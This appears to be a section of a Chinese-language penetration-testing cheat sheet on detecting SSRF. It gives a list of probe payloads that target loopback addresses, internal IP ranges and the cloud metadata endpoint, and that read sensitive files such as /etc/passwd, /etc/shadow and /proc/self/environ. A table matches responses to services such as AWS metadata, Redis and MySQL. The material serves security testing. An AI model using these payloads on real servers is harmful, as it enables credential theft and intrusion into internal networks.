## 二、SSRF检测与分类

### 2.1 回显差异判断
- **完全回显**：响应内容直接返回目标URL的响应内容（最理想）
- **部分回显**：只返回标题/状态码/Content-Type
- **无回显（Blind SSRF）**：只知道请求是否成功，通过DNS/HTTP外带判断
- **时间差异**：通过响应时间差异判断端口开放（开放端口响应快，关闭端口超时）

### 2.2 基础探测Payload
```
# 回环/本地探测
http://127.0.0.1
http://127.0.0.1:80
http://localhost
http://0.0.0.0
http://[::1]
http://0

# 本地文件
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/cmdline
file:///proc/self/environ
file:///etc/shadow
file:///var/www/html/config.php
file:///etc/nginx/nginx.conf
file:///etc/hosts

# 内网IP段
http://10.0.0.1
http://172.16.0.1
http://192.168.0.1
http://169.254.169.254    （云元数据）
```

### 2.3 回显内容特征识别
| 响应内容 | 识别目标 |
|---------|---------|
| `root:x:0:0:` | file:///etc/passwd读取成功 |
| `#`号开头 | /etc/hosts |
| `AMI-`/`i-`/AKIA开头 | AWS元数据 |
| Redis版本/`-ERR` | Redis未授权 |
| `<!DOCTYPE html>` + 后台标题 | 内网Web应用 |
| `HTTP/1.1 401 Unauthorized` | 需认证服务 |
| `SSH-2.0` | SSH服务 |
| `MySQL|` / `nysql`乱码 | MySQL服务 |
| `+PONG` / `+OK` | Redis |
| `VERSION` / `STORED` | Memcached |
| `HTTP/1.1 200` + `{"status":"green"}` | Elasticsearch |

